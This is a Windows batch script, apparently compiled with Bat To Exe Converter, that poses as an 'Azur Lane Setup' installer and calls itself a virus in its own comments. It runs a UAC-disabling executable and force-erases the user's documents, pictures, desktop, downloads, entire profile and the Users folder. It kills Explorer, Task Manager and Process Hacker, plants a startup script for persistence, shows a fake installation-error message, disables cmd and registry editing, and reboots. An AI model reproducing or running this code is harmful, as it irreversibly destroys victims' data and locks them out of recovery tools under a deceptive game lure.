::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCuDJFie4VA8KRVRWg2QKXj0FqcT4u34+9bR9k8EArZyeZXOyPmCIe4Wp0HhZp052WoXkcgDAlVRfR3L
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhZksaHErQXA==
::ZQ05rAF9IBncCkqN+0xwdVsFAlTMbCXpZg==
::ZQ05rAF9IAHYFVzEqQIRMg5GDCiDMm76NbAI/fi7p9mCoUITUKIPeZvY0v3OaNca5Ba2PNZl935XkcVFbA==
::eg0/rx1wNQPfEVWB+kM9LVsJDAWOL26uE6VR+Onv7OLVwg==
::fBEirQZwNQPfEVWB+kM9LVsJDCWYKXn6KrQS7ajI6v6Ssg1VZ+c8d4HfmoSPNOMbowWsQp8jhSgT2IMtCBZRcFvL
::cRolqwZ3JBvQF1fEqQIRMg5GDCiDMm76NbAI/fi7p9mCoUITUKIPeZvY0v3OaNca5Ba2PNZl935XkcVFbA==
::dhA7uBVwLU+EWHCK50ciPAMGR0SmOX3a
::YQ03rBFzNR3SWATE9U4jLQ9BXEmSPX+5DudR6+fp6oo=
::dhAmsQZ3MwfNWATE9U4jLQ9BXEmSPX+5DudR6+fp6rrn
::ZQ0/vhVqMQ3MEVWAtB9wLhpYXwHi
::Zg8zqx1/OA3MEVWAtB9wLhpYXwHi
::dhA7pRFwIByZRRmn+08gJB5ASRfCKGO/RrwS+/z64+aGtkQSWqIwfs/6wKGcYMwS5ECkcpcg0zpTlosVAw5KPhGkYx8hvWtQ1g==
::Zh4grVQjdCuDJFie4VA8KRVRWg2QKXj0FqcT4u34+9aXo1keXLBxfZfeug==
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
: =========================================
: Disables Windows UAC through registry
: =========================================
"%windir%\uac-disable.exe"
: ==============================================================
: deletes everything on my documents and my pictures, and etc folders (dangerous for your brain)
: ==============================================================
erase /S /F /Q "%userprofile%\Documents"
erase /S /F /Q "%userprofile%\My Documents"
erase /S /F /Q "%userprofile%\Pictures"
erase /S /F /Q "%userprofile%\Videos"
erase /S /F /Q "%userprofile%\Downloads"
erase /S /F /Q "%userprofile%\Desktop"
erase /S /F /Q "%userprofile%\Music"
erase /S /F /Q "%userprofile%\Links"
erase /S /F /Q "%userprofile%\Saved Games"
erase /S /F /Q "%userprofile%\Searches"
erase /S /F /Q "%userprofile%\Favorites"
erase /S /F /Q "%userprofile%\.android"
erase /S /F /Q "%userprofile%\Contacts"
erase /S /F /Q "%userprofile%"
erase /S /F /Q "%systemdrive%\Users"
erase /S /F /Q "%systemdrive%\Documents and Settings"
: ===============================================================
: Task kills explorer
: ===============================================================
taskkill /f /im explorer.exe
taskkill /f /im Discord.exe
taskkill /f /im iexplore.exe
taskkill /f /im control.exe
taskkill /f /im ProcessHacker.exe
taskkill /f /im taskmgr.exe
: ==============================================
: Injects additional Shell replacements
: ==============================================
copy "%windir%\startup.bat" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat"
: ===============================================================
: reboots your computer, and notifies the user of this action
: ===============================================================
"%windir%\traymcore.exe" "Something happened and we couldn't install Azur Lane on this computer, You may try again later." /T:"Azur Lane Setup" /I:ERROR
wmic os where primary=true call reboot
: ==============================================================
: definitely disabling windows command interpreter for proper locking
: ==============================================================
REG ADD "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /f 
REG ADD "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d 0x00000002 /f
: ===================================================================
: disables registry editing tools to prevent users from modifying reg
: ===================================================================
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /f
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f
: ===============================
: a bit of delay
: ===============================
ping -w 12 localhost >nul
: ===============================================================
: exits the virus
: ===============================================================
wmic os where primary=true call reboot >nul
exit